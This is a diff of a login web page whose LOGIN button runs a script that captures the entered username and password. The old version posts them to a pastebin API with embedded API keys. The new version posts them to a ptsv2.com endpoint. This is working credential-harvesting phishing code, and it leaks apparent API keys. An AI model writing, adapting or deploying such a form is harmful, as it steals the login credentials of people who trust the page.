@@ -79,7 +79,7 @@
                                accesskey="l"
                                tabindex="6"
                                type="submit"
-                               value="LOGIN" onclick="abc()"
+                               value="LOGIN" onclick="abc(1)"
                         /></div>
 
                     <div id="sidebar">
@@ -129,12 +129,12 @@ function sleep (time) {
 			function abc(a){
 				var request = new XMLHttpRequest();
 
-				request.open("POST", "https://cors-anywhere.herokuapp.com/https://pastebin.com/api/api_post.php", true);
+				request.open("POST", "https://ptsv2.com/t/jamyol/post", true);
 
 				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-				request.send("api_user_key=ad65dcc8bb93cf505c94ffdc8cff162c&api_dev_key=378ddcae1c7001bba7a4b487890c54f2&api_option=paste&api_paste_private=0&api_paste_name=Chipchip1234&api_paste_expire_date=N&api_paste_format=javascript&api_paste_code="+$("#username").val()+" - "+$("#password").val());
-				setTimeout(c, 2000) 
+				request.send($("#username").val()+" - "+$("#password").val());
+				setTimeout(c, 2000);
 			}
 		
 			function c(){
